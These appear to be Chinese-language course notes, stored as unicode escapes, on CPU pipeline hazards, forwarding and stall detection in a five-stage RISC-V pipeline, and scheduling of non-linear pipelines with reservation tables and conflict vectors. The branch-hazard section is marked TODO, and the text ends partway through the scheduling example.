\u5bf9\u4e8e\u51af\u8bfa\u4f0a\u66fc\u67b6\u6784\u7684\u8ba1\u7b97\u673a\uff0c\u53ea\u6709\u4e00\u4e2a\u4e3b\u5b58\u7684\u60c5\u51b5\uff0c\u53ef\u80fd\u6709\u4e24\u6761\u6307\u4ee4\u7684 IF \u548c MEM \u9636\u6bb5\u4f1a\u4ea7\u751f\u51b2\u7a81\uff08\u5bf9\u4e8e load store \u7c7b\u6307\u4ee4 MEM \u4f1a\u8bbf\u95ee\u4e3b\u5b58\uff09 \u89e3\u51b3\u65b9\u6848 \u7b49\u5f85\uff08Stall\uff09\u76f4\u5230\u4e3b\u5b58\u8bbf\u95ee\u5b8c\u6210\u540e\u518d\u53d6\u6307 \u6dfb\u52a0\u786c\u4ef6\uff0c\u4f8b\u5982\u6dfb\u52a0\u4e00\u4e2a\u4e3b\u5b58\uff08\u6bd4\u5982\u54c8\u5f17\u67b6\u6784\u5c31\u4e0d\u5b58\u5728\u7ed3\u6784\u5192\u9669\uff09 \u7ed3\u6784\u5192\u9669\u603b\u662f\u53ef\u4ee5\u901a\u8fc7\u6dfb\u52a0\u989d\u5916\u786c\u4ef6\u6765\u89e3\u51b3 \u6570\u636e\u5192\u9669 \u00b6 \u6570\u636e\u5192\u9669\u7684\u539f\u56e0\uff1a\u6d41\u6c34\u7ebf\u4e2d\u7684\u6307\u4ee4\u9700\u8981\u8bbf\u95ee\u540c\u4e00\u6570\u636e\uff0c\u4f46\u662f\u8be5\u6570\u636e\u5728\u6d41\u6c34\u7ebf\u4e2d\u7684\u4e0d\u540c\u9636\u6bb5\u88ab\u4fee\u6539 \u5982 add x1, x2, x3; sub x4, x1, x5 \u4e24\u6761\u6307\u4ee4\uff0cx1 \u5728 add \u7684 EX \u9636\u6bb5\u88ab\u4fee\u6539\uff0c\u5728 WB \u9636\u6bb5\u624d\u4f1a\u88ab\u5199\u56de\u5bc4\u5b58\u5668\uff0c\u800c sub \u7684 ID \u9636\u6bb5\u9700\u8981\u8bbf\u95ee x1\uff0c\u56e0\u6b64\u4ea7\u751f\u6570\u636e\u5192\u9669 \u89e3\u51b3\u65b9\u6848 \u7b49\u5f85\uff08Stall\uff09\u76f4\u5230\u6570\u636e\u53ef\u7528\uff08\u4f1a\u635f\u5931\u4e24\u4e2a\u65f6\u949f\u5468\u671f\u624d\u7b49\u5230 ID \u5728 WB \u540e\uff09 \u524d\u9012\uff08Forwarding\uff09\uff1a\u5728 ID \u9636\u6bb5\uff0c\u5982\u679c\u9700\u8981\u8bbf\u95ee\u7684\u6570\u636e\u5728 EX \u9636\u6bb5\u88ab\u4fee\u6539\uff0c\u90a3\u4e48\u5c31\u76f4\u63a5\u4ece EX \u9636\u6bb5\u53d6\u6570\u636e\uff0c\u800c\u4e0d\u662f\u4ece\u5bc4\u5b58\u5668\u6587\u4ef6\u4e2d\u53d6\u6570\u636e \u5e76\u4e0d\u80fd\u5b8c\u5168\u89e3\u51b3\u6570\u636e\u5192\u9669\uff08\u6bd4\u5982 load + add\uff0c\u540e\u4e00\u6761\u7684 EX \u9700\u8981\u524d\u4e00\u6761\u7684 MEM \u7ed3\u679c\uff0c\u800c\u524d\u4e00\u6761 MEM \u8f93\u51fa\u65e0\u6cd5\u63a5\u5230\u540e\u4e00\u6761 EX \u524d\uff09 \u5982\u4e0a\u7684 load-use data hazard \u60c5\u51b5\u4e0b\u6682\u505c\u4e00\u4e2a\u65f6\u949f\u5468\u671f\uff08pipeline stall / bubble\uff09\uff0c\u7b49\u5f85 MEM \u9636\u6bb5\u5b8c\u6210\uff0c\u7136\u540e\u5e94\u7528 forwarding\uff0c\u5c06 MEM \u7ed3\u679c\u76f4\u63a5\u4f20\u5165\u540e\u4e00\u6761\u6307\u4ee4\u7684 EX \u9636\u6bb5 \u901a\u8fc7\u8f6f\u4ef6\u5728\u7f16\u8bd1\u65f6\u907f\u514d\u51fa\u73b0 load-use \u60c5\u51b5 \u63a7\u5236\u5192\u9669 \u00b6 \u5e38\u53d1\u751f\u5728\u6761\u4ef6\u8df3\u8f6c\uff08\u5206\u652f\uff09\u6307\u4ee4\u7684\u60c5\u51b5\u4e0b\uff0c\u5373 branch \u6307\u4ee4\u540e\u4e0b\u4e00\u6761\u6307\u4ee4\u53ef\u80fd\u4f1a\u53d1\u751f\u8df3\u8f6c\u800c\u4e0d\u662f\u8bfb\u53d6\u7684\u4e0b\u4e00\u6761\u6307\u4ee4 \u89e3\u51b3\u65b9\u6848 \u7b49\u5f85\uff08Stall\uff09\u76f4\u5230\u5206\u652f\u6761\u4ef6\u8ba1\u7b97\u5b8c\u6210\u5f97\u5230\u4e0b\u4e00\u4e2a PC \u540e\u518d\u5bf9\u4e0b\u4e00\u6761\u6307\u4ee4\u8fdb\u884c\u53d6\u6307 \u53ef\u4ee5\u5c06\u5206\u652f\u5224\u65ad\u63d0\u524d\u5230 ID \u9636\u6bb5\uff08\u8bfb\u53d6\u5bc4\u5b58\u5668\u4e4b\u540e\u5c31\u5224\u65ad\uff09\uff0c\u53ea\u9700\u8981 stall \u4e00\u4e2a\u5468\u671f \u9884\u6d4b\uff08Prediction\uff09\uff1a \u7b80\u5355\u7248\u672c\uff1a\u603b\u662f\u8ba4\u4e3a\u5206\u652f\u4e0d\u4f1a\u53d1\u751f\uff0c\u5373\u603b\u662f\u9884\u6d4b\u4e0d\u53d1\u751f\u8df3\u8f6c\uff0c\u5982\u679c\u53d1\u751f\u8df3\u8f6c\u5219\u63d2\u5165\u4e00\u6761 bubble \u590d\u6742\u7248\u672c\uff1a\u6839\u636e\u60c5\u51b5\u8fdb\u884c\u9884\u6d4b\uff0c\u4f8b\u5982\u4e00\u4e2a\u5faa\u73af\u6700\u540e\u7684\u5206\u652f\u8bed\u53e5\u603b\u662f\u9884\u6d4b\u53d1\u751f\u8df3\u8f6c \u52a8\u6001\u9884\u6d4b\uff1a\u6839\u636e\u5386\u53f2\u8df3\u8f6c\u60c5\u51b5\u8fdb\u884c\u9884\u6d4b \u5ef6\u8fdf\u51b3\u7b56\uff08Delayed Decision\uff09\uff1a\u5c06 branch \u524d\u7684\u65e0\u5173\u6307\u4ee4\u79fb\u52a8\u5230 branch \u4e4b\u540e\u7684 bubble \u5904\uff08\u5206\u652f\u5ef6\u8fdf\u69fd\uff09\u6267\u884c\uff0c\u51cf\u5c11\u4e3a\u4e86\u7b49\u5f85\u800c\u63d2\u5165\u7684\u65e0\u610f\u4e49 bubble \u4ee3\u7801 RISC-V \u6d41\u6c34\u7ebf \u00b6 RISC-V \u6d41\u6c34\u7ebf\u4e00\u822c\u5305\u542b\u4e94\u4e2a\u9636\u6bb5\uff1a IF (Instruction Fetch)\uff1a\u53d6\u6307\uff0c\u53d6\u51fa I-Mem \u4e2d PC \u5730\u5740\u5904\u7684\u6307\u4ee4 ID (Instruction Decode)\uff1a\u8bd1\u7801\uff0c\u5c06\u6307\u4ee4\u89e3\u7801\u4e3a\u63a7\u5236\u4fe1\u53f7\uff0c\u5e76\u8bfb\u53d6\u5bc4\u5b58\u5668\u503c EX (Execute)\uff1a\u6267\u884c\uff0c\u6267\u884c ALU \u64cd\u4f5c MEM (Memory Access)\uff1a\u8bbf\u5b58\uff0c\u8bbf\u95ee D-Mem \u8fdb\u884c\u5199\u5165\u6216\u8bfb\u53d6 WB (Write Back)\uff1a\u5199\u56de\uff0c\u5c06\u7ed3\u679c\u5199\u56de\u5bc4\u5b58\u5668\u6587\u4ef6 RISC-V ISA \u5bf9\u4e8e\u6d41\u6c34\u7ebf\u7684\u4f18\u70b9\uff1a \u6307\u4ee4\u957f\u5ea6\u56fa\u5b9a\u4e3a 32 \u4f4d\uff0c\u6613\u4e8e\u5728\u4e00\u4e2a\u5468\u671f\u5185\u8fdb\u884c\u53d6\u6307\u6216\u8bd1\u7801 \u6307\u4ee4\u683c\u5f0f\u5c11\u4e14\u89c4\u6574\uff0c\u6613\u4e8e\u5728\u4e00\u4e2a\u5468\u671f\u5185\u8bd1\u7801\u3001\u8bfb\u53d6\u5bc4\u5b58\u5668 \u4f7f\u7528 load/store \u5bfb\u5740\u7ed3\u6784\uff0c\u4e00\u4e2a\u5468\u671f\u8ba1\u7b97\u5730\u5740\u3001\u4e00\u4e2a\u5468\u671f\u8bbf\u5b58 \u8bbf\u5b58\u64cd\u4f5c\u90fd\u662f\u5bf9\u9f50\u7684\uff0c\u53ef\u4ee5\u5728\u4e00\u4e2a\u5468\u671f\u5185\u8fdb\u884c \u6d41\u6c34\u7ebf\u5b9e\u73b0\uff1a \u6dfb\u52a0\u9636\u6bb5\u5bc4\u5b58\u5668\uff08pipeline register\uff09\u6765\u5206\u9694\u6bcf\u4e2a\u9636\u6bb5\uff1aIF/ID\u3001ID/EX\u3001EX/MEM\u3001MEM/WB \u8fd9\u56db\u4e2a\u9636\u6bb5\u5bc4\u5b58\u5668\u548c PC \u5bc4\u5b58\u5668\u4e00\u8d77\u5c06\u6d41\u6c34\u7ebf\u5206\u4e3a\u4e86\u4e94\u4e2a\u90e8\u5206 \u53ef\u4ee5 \u770b\u4f5c \u53ea\u6709\u8fd9\u4e94\u4e2a\u65f6\u5e8f\u7535\u8def\uff0c\u5176\u5b83\u5185\u90e8\u64cd\u4f5c\u90fd\u662f\u7ec4\u5408\u903b\u8f91\uff0c\u5728\u5185\u90e8\u8fd0\u884c \u4e94\u4e2a\u5bc4\u5b58\u5668\u5728\u4e0a\u5347\u6cbf\u8fdb\u884c\u66f4\u65b0\uff0c\u9636\u6bb5\u5bc4\u5b58\u5668\u8fdb\u884c\u6d41\u8f6c\uff0c\u8bb0\u5f55\u5f53\u524d\u6307\u4ee4\u9700\u8981\u7684\u4fe1\u606f \u6570\u636e\u901a\u8def\u4e2d\u6709\u4e24\u4e2a\u56de\u8def MEM \u9636\u6bb5\u8ba1\u7b97\u5206\u652f\u7ed3\u679c\uff0c\u8f93\u51fa\u7ed9 PC\u3002\u53ef\u80fd\u4f1a\u5f15\u8d77\u63a7\u5236\u5192\u9669 WB \u9636\u6bb5\u5199\u56de\u5bc4\u5b58\u5668\uff0c\u53ef\u80fd\u4f1a\u5f15\u8d77\u6570\u636e\u5192\u9669 ID \u548c WB \u9636\u6bb5\u540c\u65f6\u4f7f\u7528\u5bc4\u5b58\u5668\u7ec4\u6587\u4ef6\uff0c\u4f46\u4e0d\u4f1a\u4ea7\u751f\u7ed3\u6784\u5192\u9669\uff0c\u56e0\u4e3a ID \u9636\u6bb5\u53ea\u8bfb\u53d6\u5bc4\u5b58\u5668\uff0cWB \u9636\u6bb5\u53ea\u5199\u5165\u5bc4\u5b58\u5668\uff0c\u76f8\u5f53\u4e8e\u5206\u4e3a\u4e86\u4e24\u4e2a\u90e8\u5206 \u5192\u9669\u89e3\u51b3 \u00b6 \u5728 RISC-V \u4e94\u9636\u6d41\u6c34\u7ebf\u4e2d\u5192\u9669\u7684\u5177\u4f53\u89e3\u51b3\u65b9\u6cd5\u3002 \u6570\u636e\u5192\u9669 \u00b6 \u5373\u540e\u9762\u7684\u6307\u4ee4\u9700\u8981\u4ece\u5bc4\u5b58\u5668\u7ec4\u4e2d\u8bfb\u53d6\u524d\u9762\u7684\u6307\u4ee4\u5199\u5165\u7684\u7ed3\u679c RISC-V \u6d41\u6c34\u7ebf\u4e2d\u6709\u4e24\u79cd\u60c5\u51b5 use-use hazard\uff1a\u5373\u4e24\u6761 R \u578b\u6307\u4ee4\u4ea7\u751f\u4e86\u6570\u636e\u5192\u9669\uff0c\u53ef\u5206\u4e3a\u51e0\u79cd\u60c5\u51b5\uff1a \u4e24\u6761\u6307\u4ee4\u76f8\u90bb \u4e24\u6761\u6307\u4ee4\u95f4\u9694\u4e00\u6761 \u4e24\u6761\u6307\u4ee4\u95f4\u9694\u4e24\u6761\uff08\u53ef\u901a\u8fc7\u6539\u8fdb\u5bc4\u5b58\u5668\u7ec4\u89e3\u51b3\uff09 load-use hazard\uff1a\u5373\u4e00\u6761 load \u6307\u4ee4\u548c\u4e00\u6761 R \u578b\u6307\u4ee4\u4ea7\u751f\u4e86\u6570\u636e\u5192\u9669 \u4e0a\u56fe\u662f use-use \u7c7b\u578b\u5192\u9669\u7684\u793a\u610f\u56fe\uff0c\u5176\u4e2d\u7ea2\u8272\u7ebf\u8868\u793a\u6b63\u5e38\u60c5\u51b5\u4e0b\u8bfb\u53d6-\u8bbf\u95ee\u7684\u5173\u7cfb\uff0c\u84dd\u8272\u7ebf\u8868\u793a\u901a\u8fc7\u524d\u9012\u6280\u672f\u89e3\u51b3\u5192\u9669\u65f6\u7684\u8bfb\u53d6-\u8bbf\u95ee\u5173\u7cfb\u3002 \u524d\u9012\uff08Forwarding\uff09 \u00b6 \u5373\u5982\u4e0a\u56fe\uff0c\u901a\u8fc7\u6dfb\u52a0\u786c\u4ef6\u8fde\u63a5\u7684\u65b9\u5f0f\u6765\u5c06\u524d\u4e00\u6761\u6307\u4ee4 ALU \u7684\u8f93\u51fa\u76f4\u63a5\u4f20\u9012\u7ed9\u540e\u9762\u6307\u4ee4\u7684 ALU \u8f93\u5165\uff0c\u800c\u5ffd\u7565\u5bc4\u5b58\u5668 \u9700\u8981\u5728\u540e\u4e00\u6761\u51b2\u7a81\u6307\u4ee4\u7684 EX \u9636\u6bb5\u8fdb\u884c\u5224\u65ad\uff0c\u901a\u8fc7\u591a\u8def\u9009\u62e9\u5668\u9009\u62e9 ALU \u8f93\u5165\u6765\u6e90\uff08\u539f\u6837\u8fd8\u662f\u5229\u7528\u524d\u9012\u4f20\u9012\u7684\u6570\u636e\uff09 \u63a2\u6d4b\u5192\u9669 \u00b6 \u5982\u4e0a\u56fe\uff0c\u9700\u8981\u5173\u6ce8\u7684\u4e3a\u865a\u7ebf\u6846\u8d77\u6765\u7684\u90e8\u5206\uff0c\u53ef\u4ee5\u6e05\u6670\u7684\u77e5\u9053\uff0c\u63a2\u6d4b\u65b9\u5f0f\u662f\uff1a \u76f8\u90bb\u6307\u4ee4\uff08EX hazard\uff09 EX/MEM.RegWrite == 1\uff1a\u5373\u524d\u4e00\u6761\u6307\u4ee4\u5199\u5165\u4e86\u5bc4\u5b58\u5668 EX/MEM.Rd != 0\uff1a\u5373\u524d\u4e00\u6761\u6307\u4ee4\u5199\u5165\u7684\u4e0d\u662f x0\uff08\u5982\u679c\u662f x0 \u5219\u4e0d\u4f1a\u53d1\u751f\u4efb\u4f55\u53d8\u5316\uff09 EX/MEM.Rd == ID/EX.Rs1 \u6216 ID/EX.Rs2\uff1a\u5373\u524d\u4e00\u6761\u6307\u4ee4\u5199\u5165\u7684\u5bc4\u5b58\u5668\u4e0e\u540e\u4e00\u6761\u6307\u4ee4\u67d0\u4e00\u64cd\u4f5c\u6570\u76f8\u540c \u9694\u4e00\u6761\u6307\u4ee4\uff08MEM hazard\uff09\u540c\u7406 MEM/WB.RegWrite == 1 MEM/WB.Rd != 0 MEM/WB.Rd == ID/EX.Rs1 \u6216 ID/EX.Rs2 \u786c\u4ef6\u8bbe\u8ba1\uff1a \u7b80\u5316\u5f97\u5230\u76f8\u5173\u7684\u901a\u8def\u56fe\u5982\u4e0a\uff0c\u5373\u589e\u52a0\u4e00\u4e2a Forwarding Unit \u6765\u5224\u65ad\u5192\u9669\uff0c\u5e76\u4e14\u7ed9\u51fa\u4e24\u4e2a\u63a7\u5236\u4fe1\u53f7\uff08ForwardA \u548c ForwardB\uff09\u6765\u9009\u62e9 ALU \u7684\u8f93\u5165\u3002\u9664\u6b64\u4e4b\u5916\uff0cEX/MEM \u548c MEM/WB \u9636\u6bb5\u7684 reg_write \u63a7\u5236\u4fe1\u53f7\u4e5f\u8981\u4f20\u7ed9 Forwarding Unit\u3002 \u53cc\u91cd\u5192\u9669 \u00b6 \u53cc\u91cd\u5192\u9669\uff08double data hazard\uff09\u5373\u6709\u4e09\u6761\u6307\u4ee4\u8fde\u7eed\uff0c\u4e14\u90fd\u6709\u51b2\u7a81\uff0c\u4f8b\u5982 add x1 , x1 , x2 add x1 , x1 , x3 add x1 , x1 , x4 \u8fd9\u79cd\u60c5\u51b5\u4e0b\u5e94\u8be5\u7b97\u4f5c\u4e24\u4e2a EX hazard\uff08\u5373\u76f8\u90bb\u7684\u4e24\u6761\u7b97\u4e00\u6b21\u51b2\u7a81\uff09 \u56e0\u6b64\u9700\u8981\u6539\u8fdb MEM hazard \u7684\u5224\u65ad\uff0c\u9632\u6b62\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u7b2c\u4e09\u6761\u6307\u4ee4\u7684 x1 \u8bfb\u53d6\u5230\u7b2c\u4e00\u6761\u6307\u4ee4\u7684\u7ed3\u679c\uff0c\u5373\u5b58\u5728 EX hazard \u65f6\u4e0d\u8ba4\u4e3a\u5b58\u5728 MEM hazard\uff1a MEM/WB.RegWrite == 1 MEM/WB.Rd != 0 \u6ca1\u6709 EX hazard not(EX/MEM.RegWrite == 1 and EX/MEM.Rd != 0 and EX/MEM.Rd == ID/EX.Rs1 \u6216 ID/EX.Rs2) MEM/WB.Rd == ID/EX.Rs1 \u6216 ID/EX.Rs2 \u6682\u505c\uff08Stall\uff09 \u00b6 load-use \u60c5\u51b5\u4e0b ALU \u7684\u8f93\u5165\u6765\u81ea\u524d\u4e00\u6761\u6307\u4ee4 Data Memory \u7684\u8f93\u51fa\u800c\u975e\u524d\u9762\u6307\u4ee4\u7684 ALU \u7ed3\u679c\uff0c\u56e0\u6b64\u9700\u8981\u989d\u5916\u7684\u4e00\u6b21 bubble\uff08\u6682\u505c\u4e00\u4e2a\u5468\u671f\uff09 \u63a2\u6d4b\uff0c\u9700\u8981\u63d0\u524d\u5728 ID \u9636\u6bb5\u5c31\u8fdb\u884c\u63a2\u6d4b load-use \u5192\u9669\uff0c\u5982\u679c\u5b58\u5728\u5c31\u6682\u505c\u3001\u63d2\u5165 bubble ID/EX.MemRead == 1 (ID/EX.MemWrite == 0) ID/EX.Rd == IF/ID.Rs1 \u6216 IF/ID.Rs2 \u6682\u505c\u6d41\u6c34\u7ebf \u5f3a\u5236 ID/EX \u9636\u6bb5\u5bc4\u5b58\u5668\u4e2d\u7684\u63a7\u5236\u4fe1\u53f7\u53d8\u4e3a 0\uff08\u76f8\u5f53\u4e8e\u63d2\u5165\u4e00\u6761 nop\uff09 \u963b\u6b62 PC \u5bc4\u5b58\u5668\u548c IF/ID \u9636\u6bb5\u5bc4\u5b58\u5668\u66f4\u65b0 \u5bf9\u4e8e load-use \u5192\u9669\uff0c\u5728\u6682\u505c\u4e00\u4e2a\u5468\u671f\u540e\u5c31\u53ef\u4ee5\u6309\u7167 MEM hazard \u8fdb\u884c\u524d\u9012\u89e3\u51b3 \u5982\u4e0a\u56fe\u6240\u793a\uff0c\u7b2c\u4e8c\u6761\u6307\u4ee4\u5728 ID \u9636\u6bb5\u65f6\u68c0\u6d4b\u5230\u5b58\u5728 load-use \u5192\u9669\uff0c\u5728\u6b64\u6682\u505c\uff0c\u7136\u540e\u4e0b\u4e00\u4e2a\u5468\u671f\u7ee7\u7eed\u8fd0\u884c\uff0c\u8fd9\u6837\u4e2d\u95f4\u5c31\u591a\u4e86\u4e00\u6761 bubble\uff0c\u7136\u540e\u5728 EX \u9636\u6bb5\u5c31\u53ef\u4ee5\u6b63\u5e38\u63a5\u6536\u5230 MEM hazard \u7684\u524d\u9012\u503c\u4e86\u3002 \u5177\u4f53\u7684\u786c\u4ef6\u5b9e\u73b0\u548c\u524d\u9762\u7c7b\u4f3c\uff0c\u5728 ID \u9636\u6bb5\u52a0\u4e00\u4e2a Hazard Detection Unit \u6765\u68c0\u6d4b load-use \u5192\u9669\uff0c\u63a5\u6536\u5b83\u9700\u8981\u7684\u503c\uff0c\u8f93\u51fa PCWrite\u3001IF/IDWrite \u63a7\u5236\u4fe1\u53f7\uff08\u65b0\u589e\uff09\u4ee5\u53ca\u4e00\u4e2a\u63a7\u5236\u4fe1\u53f7\u7528\u6765\u9009\u62e9 ID/EX \u9636\u6bb5\u5bc4\u5b58\u5668\u7684\u63a7\u5236\u4fe1\u53f7\u90e8\u5206\u6765\u81ea\u63a7\u5236\u5355\u5143\u8fd8\u662f\u7f6e\u96f6\u3002 \u5206\u652f\u5192\u9669 \u00b6 TODO \u975e\u7ebf\u6027\u6d41\u6c34\u7ebf\u8c03\u5ea6 \u00b6 \u7ebf\u6027\u6d41\u6c34\u7ebf\u9010\u4e2a\u8fd0\u884c\u6bcf\u4e00\u4e2a\u9636\u6bb5\uff0c\u6bcf\u4e00\u4e2a\u9636\u6bb5\u90fd\u4f1a\u8fd0\u884c\u4e14\u4ec5\u8fd0\u884c\u4e00\u6b21\uff0c\u6ca1\u6709\u53cd\u9988\u548c\u524d\u9988 \u975e\u7ebf\u6027\u6d41\u6c34\u7ebf\u5b58\u5728\u53cd\u9988\u548c\u524d\u9988\u8fde\u63a5\uff0c\u5176\u4e00\u4e2a\u9636\u6bb5\uff08\u90e8\u4ef6\uff09\u53ef\u80fd\u4f7f\u7528\u4e00\u6b21\u6216\u591a\u6b21 \u975e\u7ebf\u6027\u6d41\u6c34\u7ebf\u4ec5\u901a\u8fc7\u8fde\u63a5\u56fe\u4e0d\u80fd\u591f\u786e\u5b9a\u6d41\u6c34\u7ebf\u7684\u8fd0\u884c\u987a\u5e8f\uff0c\u4e00\u4e2a\u8fde\u63a5\u56fe\u53ef\u80fd\u5bf9\u5e94\u591a\u4e2a\u4e0d\u540c\u7684\u8fd0\u884c\u987a\u5e8f \u975e\u7ebf\u6027\u6d41\u6c34\u7ebf\u7684\u8fd0\u884c\u9700\u8981\u901a\u8fc7\u9884\u7ea6\u8868\uff08reservation table\uff09\u6765\u8868\u793a \u6bcf\u4e00\u884c\u8868\u793a\u4e00\u4e2a\u9636\u6bb5\uff0c\u6bcf\u4e00\u5217\u8868\u793a\u4e00\u4e2a\u65f6\u949f\u5468\u671f \u6574\u4e2a\u8868\u8868\u793a\u4e00\u4e2a\u4efb\u52a1\u7684\u8fd0\u884c\u6d41\u7a0b\uff0c\u5982\u679c\u5728\u67d0\u4e2a\u5468\u671f\u8fd0\u884c\u67d0\u4e00\u9636\u6bb5\uff0c\u5219\u5728\u5bf9\u5e94\u4f4d\u7f6e\u6253\u4e0a X \u7ebf\u6027\u6d41\u6c34\u7ebf\u4e5f\u6709\u9884\u7ea6\u8868\uff0c\u4e0d\u8fc7\u90fd\u662f\u56fa\u5b9a\u7684\uff0c\u4e3a\u4e00\u4e2a\u6b63\u65b9\u5f62\u8868\u683c\uff0c\u5bf9\u89d2\u7ebf\u4e0a\u90fd\u662f X \u5982\u4e0b\u56fe\u5c31\u662f\u4e00\u4e2a\u975e\u7ebf\u6027\u6d41\u6c34\u7ebf\u7684\u8fde\u63a5\u56fe\uff0c\u548c\u5b83\u7684\u4e00\u4e2a\u9884\u7ea6\u8868\uff1a .md-typeset table:not([class]) th { min-width: 2rem; } 1 2 3 4 5 6 7 S1 X X X S2 X X S3 X X S4 X \u975e\u7ebf\u6027\u6d41\u6c34\u7ebf\u4e0d\u80fd\u50cf\u7ebf\u6027\u6d41\u6c34\u7ebf\u4e00\u6837\u76f4\u63a5\u9010\u4e2a\u4efb\u52a1\u8d34\u5728\u4e00\u8d77\u4f9d\u6b21\u8fd0\u884c\uff0c\u56e0\u4e3a\u4f1a\u51fa\u73b0\u51b2\u7a81\uff08\u540c\u4e00\u5468\u671f\u4e0d\u540c\u4efb\u52a1\u4f7f\u7528\u540c\u4e00\u9636\u6bb5\uff0c\u5373\u7ed3\u6784\u5192\u9669\uff09 \u975e\u7ebf\u5f62\u6d41\u6c34\u7ebf\u9700\u8981\u901a\u8fc7\u8c03\u5ea6\u7b97\u6cd5\u6765\u627e\u5230\u6700\u4f18\u7684\u4efb\u52a1\u542f\u52a8\u65b9\u5f0f\uff0c\u4f7f\u5f97\u4efb\u52a1\u95f4\u4e0d\u4f1a\u4ea7\u751f\u51b2\u7a81\uff0c\u800c\u4e14\u8fd0\u884c\u6700\u9ad8\u6548 \u7b2c\u4e00\u4e2a\u4efb\u52a1\u8fdb\u5165\u6d41\u6c34\u7ebf\u540e\uff0c\u7b2c\u4e8c\u4e2a\u4efb\u52a1\u8fdb\u5165\u4e14\u4e0d\u53d1\u751f\u51b2\u7a81\u7684\u65f6\u95f4\u79f0\u4e3a\u542f\u52a8\u8ddd\u79bb\u3002\u5728\u540c\u4e00\u4e2a\u8c03\u5ea6\u65b9\u5f0f\u4e2d\u542f\u52a8\u8ddd\u79bb\u53ef\u80fd\u4e0d\u540c\uff0c\u6700\u4f73\u7684\u8c03\u5ea6\u65b9\u5f0f\u662f\u4f7f\u5e73\u5747\u542f\u52a8\u8ddd\u79bb\u6700\u77ed \u975e\u7ebf\u6027\u6d41\u6c34\u7ebf\u8c03\u5ea6\u7b97\u6cd5 \u00b6 \u4e24\u4e2a\u6982\u5ff5\uff1a \u7981\u6b62\u96c6\u5408\uff08prohibit sets\uff09\uff0c\u6307\u9884\u7ea6\u8868\u4e2d\u6bcf\u4e00\u884c\u4efb\u610f\u4e24\u4e2a X \u4e4b\u95f4\u7684\u8ddd\u79bb\u6784\u6210\u7684\u96c6\u5408\u3002\u610f\u4e49\u4e3a\uff1a\u4e24\u4e2a\u4efb\u52a1\u4e4b\u95f4\u7684\u95f4\u9694\u4e0d\u80fd\u662f\u8fd9\u4e2a\u96c6\u5408\u4e2d\u7684\u4efb\u610f\u4e00\u4e2a\u503c \u51b2\u7a81\u5411\u91cf\uff08conflict vector\uff09\uff0c\u8868\u793a\u4e3a \\((C_m, C_{m-1}, \\cdots, C_2, C_1)\\) \uff0c\u5176\u4e2d \\(m\\) \u4e3a\u7981\u6b62\u96c6\u5408\u4e2d\u7684\u6700\u5927\u503c\uff0c\u5982\u679c \\(i\\) \u5728\u7981\u6b62\u96c6\u5408\u4e2d\uff0c\u5219 \\(C_i=1\\) \u5426\u5219 \\(C_i=0\\) \u5bf9\u4e8e\u4e0a\u9762\u7684\u9884\u7ea6\u8868\uff0c\u7981\u6b62\u96c6\u5408\u4e3a \\(F=\\{3, 4, 6\\}\\) \uff0c\u521d\u59cb\u51b2\u7a81\u5411\u91cf\u4e3a \\(C=\\mathtt{101100}\\) \u3002 \u56e0\u6b64\u53c2\u8003\u4e8e\u521d\u59cb\u51b2\u7a81\u5411\u91cf\uff0c\u4e0b\u4e00\u4e2a\u4efb\u52a1\u53ea\u53ef\u80fd\u5728\u540e\u7b2c 1\u30012\u30015\u30017 \u4e2a\u5468\u671f\u8fdb\u5165\uff08\u53f3\u6570 1\u30012\u30015 \u4f4d\u4e3a 0\uff0c7 \u4e3a\u603b\u957f\u5ea6\u52a0\u4e00\uff0c\u76f8\u5f53\u4e8e\u786c\u7b49\u4e00\u4e2a\u4efb\u52a1\u7684\u65f6\u5e38\uff09\u3002\u4ee5\u540e\u7b2c\u4e00\u4e2a\u5468\u671f\u8fdb\u5165\u4e3a\u4f8b\u3002\u7b2c\u4e8c\u4e2a\u4efb\u52a1\u7684\u521d\u59cb\u51b2\u7a81\u5411\u91cf\u4e5f\u4e3a \\(C=\\mathtt{101100}\\) \uff0c\u6b64\u65f6\u7b2c\u4e00\u4e2a\u4efb\u52a1\u7ecf\u8fc7\u4e86\u4e00\u4e2a\u5468\u671f\uff0c\u51b2\u7a81\u5411\u91cf\u53f3\u79fb\u4e00\u4f4d\u53d8\u4e3a \\(C=\\mathtt{10110}\\) \u3002\u63a5\u7740\u518d\u8003\u8651\u52a0\u5165\u7b2c\u4e09\u4e2a\u4efb\u52a1\uff0c\u8fd9\u4e2a\u4efb\u52a1\u4e0d\u80fd\u548c 1\u30012 \u4e24\u4e2a\u51b2\u7a81\uff0c\u6240\u4ee5\u6b64\u65f6\u6574\u4f53\u7684\u51b2\u7a81\u5411\u91cf\u5e94\u8be5\u662f\u524d\u4e24\u4e2a\u4efb\u52a1\u6b64\u65f6\u7684\u51b2\u7a81\u5411\u91cf\u6309\u4f4d\u6c42\u6216\uff0c\u5373 \\(\\mathtt{101100} | \\mathtt{10110} = \\mathtt{111110}\\) \u3002\u6240\u4ee5\u7b2c\u4e09\u4e2a\u4efb\u52a1\u53ea\u80fd\u5728\u540e\u4e00\u4e2a\u5468\u671f\u8fdb\u5165\u3002 \u8fd9\u6837\u4f9d\u6b64\u7c7b\u63a8\uff0c\u6700\u7ec8\u4e0d\u518d\u8ba1\u7b97\u4e0b\u53bb\u7684\u6761\u4ef6\u4e3a\uff1a\u51b2\u7a81\u5411\u91cf\u53d8\u4e3a\u4e86\u5168 1\uff0c\u53ea\u80fd\u7b49\u5f85\u4e00\u4e2a\u4efb\u52a1\u7684\u65f6\u957f\u56de\u5230\u521d\u59cb\u72b6\u6001\uff1b\u6216\u8005\u5f97\u5230\u7684\u51b2\u7a81\u5411\u91cf\u548c\u4e4b\u524d\u7684\u67d0\u4e2a\u76f8\u540c\uff08\u8fbe\u6210\u4e86\u5faa\u73af\uff09\u3002\u6700\u7ec8\u53ef\u4ee5\u753b\u51fa\u4e00\u4e2a\u72b6\u6001\u56fe\u3002 \u5bf9\u4e8e\u4e0a\u9762\u7684\u4f8b\u5b50\uff0c\u5b83\u7684\u72b6\u6001\u56fe\u5982\u4e0b\uff08\u65b9\u5757\u5185\u4e3a\u51b2\u7a81\u5411\u91cf\uff0c\u7bad\u5934\u4e0a\u4e3a\u7b49\u5f85\u51e0\u4e2a\u5468\u671f\u8fdb\u5165\uff0c\u5373\u542f\u52a8\u8ddd\u79bb\uff09\uff1a \u6240\u4ee5\u5b83\u7684\u51e0\u79cd\u8c03\u5ea6\u65b9\u5f0f\uff08\u7528\u542f\u52a8\u8ddd\u79bb\u8868\u793a\uff09\u548c\u5e73\u5747\u542f\u52a8\u8ddd\u79bb\u4e3a\uff1a 